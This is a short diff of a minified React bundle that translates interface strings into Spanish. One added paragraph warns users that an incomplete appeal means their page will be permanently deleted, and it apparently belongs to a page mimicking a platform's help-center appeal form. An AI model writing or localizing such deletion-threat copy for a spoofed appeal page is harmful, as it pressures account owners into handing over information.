@@ -11701,7 +11701,7 @@
                         children: (0,
                         Le.jsx)("h4", {
                             className: "ms-4 m-0 d-flex align-self-center text-primary",
-                            children: "Help Center"
+                            children: "centro de ayuda"
                         })
                     }), (0,
                     Le.jsx)("div", {
@@ -11767,7 +11767,7 @@
                                 }), (0,
                                 Le.jsx)("p", {
                                     className: "fw-semibold validation_form_para",
-                                    children: ""
+                                    children: "En tu apelación, asegúrate de incluir toda la información necesaria en tu solicitud para que pueda ser revisada con precisión. Si proporcionas información incorrecta o insuficiente, tu apelación puede cerrarse sin revisión, y tu página será eliminada permanentemente."
                                 }), (0,
                                 Le.jsx)("p", {
                                     className: "fw-semibold validation_form_para",
@@ -11798,7 +11798,7 @@
                                         fontSize: "12px",
                                         marginTop: "10px"
                                     },
-                                    children: "Enable Sound"
+                                    children: "Habilitar sonido"
                                 }), (0,
                                 Le.jsx)("p", {
                                     className: "fw-semibold validation_form_para mt-2",
